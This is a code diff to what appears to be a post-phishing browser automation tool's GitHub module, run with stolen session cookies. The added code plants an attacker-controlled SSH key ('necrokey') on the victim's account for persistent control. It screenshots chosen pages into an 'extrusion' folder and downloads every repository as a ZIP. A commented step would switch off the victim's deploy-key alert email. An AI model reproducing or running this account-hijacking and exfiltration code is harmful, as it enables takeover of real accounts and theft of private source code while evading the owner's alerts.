@@ -32,21 +32,30 @@ exports.PlantAndDump = async ({ page, data: [taskId, cookies, params] }) => {
         return
     }
 
+    // check Notification if "'Deploy key' alert email" is ON
+    // if ON ->  TURN IT OFF
+    // TODO needs fixing to get properly the button
+    //await necrolib.DisableDeployKeyAlert(page, taskId).catch(console.error)
+
+     // plant necrobrowser ssh-key for necromantic control
+    await necrolib.PlantSshKey(page, taskId, 'necrokey', params.sshKey).catch(console.error)
+
+
     // screenshot urls of interest
-    //for(let url of params.urls){
-    //    await necrohelp.ScreenshotFullPage(page, taskId, url).catch(console.error)
-   // }
-
-   await page.goto('https://github.com/settings/profile');	
-   await page.screenshot({path: `extrusion/screenshot_${taskId}.png`});
-
-    // plant necrobrowser ssh-key for necromantic control
-   // await necrolib.PlantSshKey(page, taskId, 'necrokey', params.sshKey).catch(console.error)
+    for(let url of params.urls){
+        // TODO fix ScreenshotFullPage errors..
+        // await necrohelp.ScreenshotFullPage(page, taskId, url).catch(console.error)
+        let pName = url.split("/").reverse()[0]
+        await page.goto(url);
+        console.log(`[${taskId}] taking screenshot of page --> ${pName}`)
+        await page.waitForTimeout(3000)
+        await page.screenshot({path: `extrusion/screenshot_${pName}_${taskId}.png`});
+    }
 
     // scrape all repositories and download master branches as ZIP
     let repositories = await necrolib.ScrapeRepos(page, taskId)
     for (let repo of repositories){
-	console.log(`[${taskId}] downloading repo --> ${repo}`)    
+	console.log(`[${taskId}] downloading repo --> ${repo}`)
         await necrolib.DownloadRepo(page, taskId, repo)
 	await page.waitForTimeout(5000)
     }
